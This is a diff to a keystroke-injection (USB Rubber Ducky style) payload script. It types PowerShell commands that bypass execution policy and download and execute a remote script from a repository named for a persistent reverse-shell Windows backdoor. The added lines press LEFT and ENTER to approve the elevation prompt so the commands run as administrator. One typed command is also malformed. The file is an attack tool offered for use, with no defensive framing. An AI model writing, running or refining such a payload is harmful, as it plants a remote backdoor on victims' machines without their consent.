@@ -31,11 +31,17 @@ DELAY 300
 STRING powershell -nop -ep bypass -c IEX(IWR Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force -UseBasicParsing);
 DELAY 100
 CTRL SHIFT ENTER
+DELAY 300
+LEFT
+ENTER
 DELAY 200
 GUI R
 DELAY 300
 STRING powershell.exe  IEX(IWR https://raw.githubusercontent.com/alariordas/PersistentReverseShell-Win10Backdoor/main/ncinstallerdebug.ps1 -UseBasicParsing);
 DELAY 100
 CTRL SHIFT ENTER
+DELAY 300
+LEFT
+ENTER
 
 
